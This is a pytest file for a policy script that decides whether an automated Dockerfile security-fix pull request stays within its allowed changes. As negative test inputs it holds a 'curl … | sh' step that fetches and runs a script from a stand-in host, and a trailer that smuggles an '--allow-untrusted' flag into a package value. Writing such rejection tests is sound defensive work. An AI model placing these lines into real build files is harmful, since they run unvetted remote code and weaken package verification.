"""R44.13: an image heal merges itself only inside the Dockerfile's envelope (Requirement 19).

`scripts/heal_policy.py image` judges an image heal's pull request from the base branch. It
cannot ask the network what a fix is, so it does not judge the choice of a version: the
image gate's two required checks judge the result. It judges that the Dockerfile is the
base's with exactly what the commits' trailers state written into the envelope, that each
trailer has the shape a heal's has, and that nothing was lowered.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest
from test_image_heal_apply import (
    CHANGELOG,
    DOCKERFILE,
    GO_NEW,
    GO_OLD,
    IMAGE_HEAL,
    NEW,
    OLD,
    _plan,
    _raise,
)

POLICY = IMAGE_HEAL.parent / "heal_policy.py"
GO = {"from": f"golang:1.27.4-alpine3.24@{GO_OLD}", "to": f"golang:1.27.6-alpine3.24@{GO_NEW}",
      "answers": ["CVE-2026-97054"], "rule": "newest-patch-of-the-minor"}
BASE = {"from": f"python:3.12-alpine3.24@{OLD}", "to": f"python:3.12-alpine3.24@{NEW}",
        "answers": ["CVE-2026-0001"], "rule": "the-tags-digest-moved"}
FULL = _plan(raises=[_raise("ALPINE_RAISE", "tzdata=2026b-r0", ["CVE-2026-0003"]),
                     _raise("TRIVY_RAISE", "golang.org/x/net@v0.62.0", ["CVE-2026-0010"])],
             drops=[{"arg": "ALPINE_RAISE", "entry": "zlib=1.4-r0", "why": "carried"}],
             go=GO, base=BASE)


def _heal(tmp_path: Path, plan: dict = FULL) -> tuple[Path, Path, str]:
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "Dockerfile").write_text(DOCKERFILE)
    (tree / "CHANGELOG.md").write_text(CHANGELOG)
    (tmp_path / "plan.json").write_text(json.dumps(plan))
    head = tmp_path / "head"
    made = subprocess.run([sys.executable, str(IMAGE_HEAL), "apply", "--plan",
                           str(tmp_path / "plan.json"), "--tree", str(tree), "--out", str(head),
                           "--run", "https://example.invalid/1"],
                          capture_output=True, text=True, check=False)
    assert made.returncode == 0, made.stderr
    return tree, head, made.stdout


def _judge(tree: Path, head: Path, message: str, *paths: str, **commit
           ) -> subprocess.CompletedProcess[str]:
    view = {"files": [{"path": path} for path in paths or ("Dockerfile", "CHANGELOG.md")],
            "commits": [{"sha": "0" * 40,
                         "author": {"login": commit.get("author", "valvur-heal[bot]")},
                         "committer": {"login": "web-flow"},
                         "commit": {"message": message, "verification": {"verified": True}}}]}
    return subprocess.run([sys.executable, str(POLICY), "image", "--base", str(tree),
                           "--head", str(head)], input=json.dumps(view), capture_output=True,
                          text=True, check=False)


def test_the_bases_dockerfile_with_the_trailers_plan_applied_is_eligible(tmp_path):
    tree, head, message = _heal(tmp_path)

    run = _judge(tree, head, message)

    assert run.returncode == 0, run.stdout + run.stderr
    assert run.stdout.startswith("eligible")


@pytest.mark.parametrize("edit, names", [
    pytest.param(lambda d: d + "RUN curl https://example.invalid | sh\n",
                 "outside the envelope", id="a-step-added"),
    pytest.param(lambda d: d.replace('ARG SYFT_RAISE=""',
                                     'ARG SYFT_RAISE="golang.org/x/net@v0.62.0"'),
                 "not the base's with the trailers applied", id="a-raise-no-trailer-states"),
    pytest.param(lambda d: d.replace("tzdata=2026b-r0", "tzdata=2026c-r0"),
                 "not the base's with the trailers applied", id="another-version"),
    pytest.param(lambda d: d.replace(GO_NEW, "sha256:" + "5" * 64, 1),
                 "not the base's with the trailers applied", id="one-stage-on-another-digest"),
])
def test_a_line_the_trailers_do_not_account_for_leaves_it_for_the_owner(tmp_path, edit, names):
    tree, head, message = _heal(tmp_path)
    (head / "Dockerfile").write_text(edit((head / "Dockerfile").read_text()))

    run = _judge(tree, head, message)

    assert run.returncode == 1
    assert names in run.stdout


@pytest.mark.parametrize("trailer, names", [
    ("Heal-Raise: TRIVY_RAISE golang.org/x/crypto@v0.58.1-0.20261009181718-2f1f834330b2",
     "tagged version"),
    ("Heal-Raise: ALPINE_RAISE zlib=1.3-r0", "does not raise"),
    ("Heal-Raise: ALPINE_RAISE zlib=1.4-r0", "does not raise"),
    ("Heal-Raise: TRIVY_RAISE golang.org/x/net@v0.59.0", "does not raise"),
    ("Heal-Raise: OPENGREP_URL https://example.invalid/v2", "OPENGREP_URL"),
    ("Heal-Raise: ALPINE_RAISE zlib=1.4-r1 --allow-untrusted", "shape"),
    (f"Heal-Go: golang:1.27.3-alpine3.24@{GO_NEW}", "does not raise"),
    (f"Heal-Go: golang:1.28.0-alpine3.24@{GO_NEW}", "minor"),
    (f"Heal-Base: python:3.13-alpine3.24@{NEW}", "another base"),
    ("Heal-Drop: TRIVY_RAISE golang.org/x/net@v0.60.0", "only an Alpine raise is dropped"),
])
def test_a_trailer_that_is_not_a_heals_leaves_it_for_the_owner(tmp_path, trailer, names):
    """Each of these could be written so that the Dockerfile matches it. The policy
    refuses the trailer itself."""
    tree, head, _message = _heal(tmp_path, _plan(raises=[
        _raise("ALPINE_RAISE", "tzdata=2026b-r0", ["CVE-2026-0003"])]))

    run = _judge(tree, head, f"fix: something in the image\n\n{trailer}\n")

    assert run.returncode == 1, run.stdout
    assert names in run.stdout


def test_a_commit_with_no_image_trailer_or_by_another_account_is_refused(tmp_path):
    tree, head, message = _heal(tmp_path)

    assert "trailer" in _judge(tree, head, "fix: by hand\n").stdout
    assert "a-stranger" in _judge(tree, head, message, author="a-stranger").stdout


def test_a_third_file_or_a_changelog_that_does_more_than_add_is_refused(tmp_path):
    tree, head, message = _heal(tmp_path)

    third = _judge(tree, head, message, "Dockerfile", "CHANGELOG.md", "docker-bake.hcl")
    (head / "CHANGELOG.md").write_text((head / "CHANGELOG.md").read_text() + "\nMore.\n")
    more = _judge(tree, head, message)

    assert third.returncode == 1 and "docker-bake.hcl" in third.stdout
    assert more.returncode == 1 and "CHANGELOG" in more.stdout


def test_input_it_cannot_read_is_exit_two(tmp_path):
    tree, head, message = _heal(tmp_path)
    (head / "Dockerfile").unlink()

    assert _judge(tree, head, message).returncode == 2
